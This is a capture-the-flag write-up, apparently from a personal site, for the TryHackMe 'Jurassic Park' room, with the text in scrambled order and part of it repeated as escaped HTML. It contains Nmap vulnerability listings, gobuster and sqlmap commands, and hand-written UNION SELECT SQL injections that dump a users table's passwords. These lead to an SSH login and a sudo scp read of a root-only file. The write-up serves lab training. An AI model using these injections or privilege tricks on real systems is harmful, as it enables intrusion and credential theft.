\tCVE-2021-40438\t6.8\tvulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\tvulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\tvulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\tvulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\tvulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2021-44224\t6.4\tvulners.com/cve/CVE-2021-44224\n|     \tCVE-2019-10082\t6.4\tvulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\tvulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\tvulners.com/cve/CVE-2019-0217\n|     \tCVE-2020-1927\t5.8\tvulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\tvulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\tvulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\tvulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\tvulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\tvulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\tvulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:42745\t5.0\tvulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\tvulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\tvulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\tvulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\tvulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\tvulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\tvulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\tvulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\tvulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\tvulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\tvulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\tvulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\tvulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\tvulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\tvulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\tvulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\tvulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\tvulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\tvulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\tvulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\tvulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\tvulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\tvulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\tvulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\tvulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\tvulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\tvulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\tvulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\tvulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\tvulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\tvulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\tvulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|_    \tMSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t0.0\tvulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/\t*EXPLOIT*\n| http-enum: \n|_  /robots.txt: Robots file\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=2/2%OT=22%CT=1%CU=42651%PV=Y%DS=4%DC=T%G=Y%TM=61FB4F78\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(\nOS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nUptime guess: 0.010 days (since Wed Feb  2 20:30:09 2022)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=264 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   35.71 ms  10.13.0.1\n2   ... 3\n4   170.37 ms 10.10.105.134\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Wed Feb  2 20:43:52 2022 -- 1 IP address (1 host up) scanned in 915.75 seconds\n\nSSH and Apache on port 80. Pretty standard. There is an enumerated /robots.txt file, which turns out to be invalid — it contains only the phrase “Wubbalubbadubdub”.\nLet’s also hit the target with gobuster:\ngobuster \\\n\t-t 50 dir \\\n\t-u http://10.10.105.134 \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nThis reveals some interesting directories:\n\n/assets is unsecured and contains site assets, and reveals that we’re running Apache 2.4.18 on Ubuntu.\n/delete is a plain text file: “New priv esc for Ubuntu?? Change MySQL password on main system!”\n/server-status is forbidden (which is not surprising).\n\nOut of curiosity, I tried loading /item.php to see if I could get file inclusion without ascending. This doesn’t work, but throws another SQL error: “Unknown column ‘robots.txt in ‘where clause’”. This indicates that we’re definitely vulnerable to some kind of injection, since robots.txt is being treated as a column spec. In fact, this indicates that there must not be any quoting going on at all!\nAnd indeed, trying /item.php or 1=1 brings up the same broken page as /item.php So I think what’s going on here is that /item.php is just doing some string filtering (it looks like it’s probably also checking if you’re trying to include a real file, as attempting to include non-existent files doesn’t trigger it).\nWhat the hell, let’s throw SQLMap at it anyway!\nsqlmap -u http://10.10.105.134/item.php \\\n       --dbms=mysql --dump-all --batch\nWell, that didn’t work.\nMeanwhile, futzing around by hand I find that /item.php union select null, null, null, null, null works and displays a slightly different error page (so, whatever the id variable is being pushed into must be at the very end of the SQL statement). And, while “&#039;” triggers the annoying error page, using a double quote (“&quot;”) does not.  Using a bit of trial-and error, we can determine that all but the first of these columns are usable, though the fourth place is easiest to read. This at least let’s us figure out our first few flags.\nThe database also appears to be running as root. Ruh roh!\nNow that we’re getting the hang of this, we can extract more information by using queries of the form: /item.php union (select null, null, null, &quot;something&quot;, null). I’m going to focus on the actual SQL inside of these parenthesis.\nselect null, null, null, count(*), null from mysql.user\nWe have four users. We can enumerate them by replacing count(*) with User and tacking on a limit clause; this just reveals that the only users are root and three standard Debian system users that are used for upgrades and maintenance.\nselect null, null, null, count(*), null\nfrom information_schema.tables\nThis reveals that there are 282 tables managed by this MySQL instance (ouch!). But how many tables are in the park database (which is what’s serving up this site)?\nselect null, null, null, count(*), null\nfrom information_schema.tables\nwhere table_schema = &quot;park&quot;\nOnly two. That seems much better. I wonder what they are?\nselect null, null, null, table_name, null\nfrom information_schema.tables\nwhere table_schema = &quot;park&quot;\nlimit 0, 1\nSo we have two tables, items and users. Let’s see what the columns of the users table are.\nselect null, null, null, column_name, null\nfrom information_schema.columns\nwhere table_schema = &quot;park&quot;\n\tand table_name = &quot;users&quot;\nlimit 0, 1\nSo, the columns are id, username, and password. Nice. Let’s dig into that table.\nselect null, null, null, password, null\nfrom park.users\nlimit 0, 1\nUnfortunately, trying to include the username column triggers the annoying error, so all we can retrieve are two passwords, D0nt3ATM3 and ih8dinos. Just for grins (and clued in by the structure of the flag questions), let’s see if we can SSH into the box as either of these using the user dennis.\nThe second works for this purpose, and the first flag is right in dennis’ home directory.\nPoking around a bit, sudo -l reveals that dennis can use scp via sudo, and the test.sh file implies that there’s a /root/flag5.txt file. Since scp works like cp for local copies, we can grab this.\nsudo scp /root/flag5.txt .\ncat flag5.txt\nContinuing to poke around, cat .bash_history reveals the third flag (as well as a lot of scp attempts around /root/flag5.txt, which I just got).\nThe ~/.viminfo file reveals two more potential flags: /boot/grub/fonts/flagTwo.txt and /tmp/flagFour.txt.\nBut, as the TryHackMe room notes, there is no fourth flag.\nElapsed Time: 2 h 53 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/jurassicpark&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Jurassic Park” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Our target is 10.10.105.134.&lt;/p&gt;\n&lt;p&gt;This is a &lt;em&gt;very&lt;/em&gt; simple site: An index page (index.php) that leads to a shop.php page, which in turn links to three calls of &lt;code&gt;item.php?id=X&lt;/code&gt; (where &lt;code&gt;X&lt;/code&gt; is a number).&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Trying to include /etc/os-release via item.php causes the site to display a Dennis Nedry page that taunts you to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SQLMap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQLMap&quot;&gt;SQLMap&lt;/a&gt;. Trying a hand-crafted test &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SQL-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQL-injection-attacks&quot;&gt;SQL injection&lt;/a&gt; also displays this page.&lt;/li&gt;\n&lt;li&gt;Trying different random indexes mostly doesn’t work, though &lt;code&gt;item.php?id=100&lt;/code&gt; displays a curiously broken page.&lt;/li&gt;\n&lt;li&gt;Trying &lt;code&gt;item.php?id=..&lt;/code&gt; throws an SQL error revealing that the site is running on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Let’s see if our usual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan turns up anything interesting:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; jurassic-park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.105.134&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This gives the following output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Feb  2 20:28:37 2022 as: nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.105.134\nHost is up (0.17s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\thttps://vulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\thttps://vulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\thttps://vulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\thttps://vulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\thttps://vulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\thttps://vulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\thttps://vulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\thttps://vulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\thttps://vulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\thttps://vulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\thttps://vulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\thttps://vulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\thttps://vulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\thttps://vulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\thttps://vulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\thttps://vulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tEDB-ID:40119\t5.5\thttps://vulners.com/exploitdb/EDB-ID:40119\t*EXPLOIT*\n|     \tEDB-ID:39569\t5.5\thttps://vulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\thttps://vulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\thttps://vulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\thttps://vulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     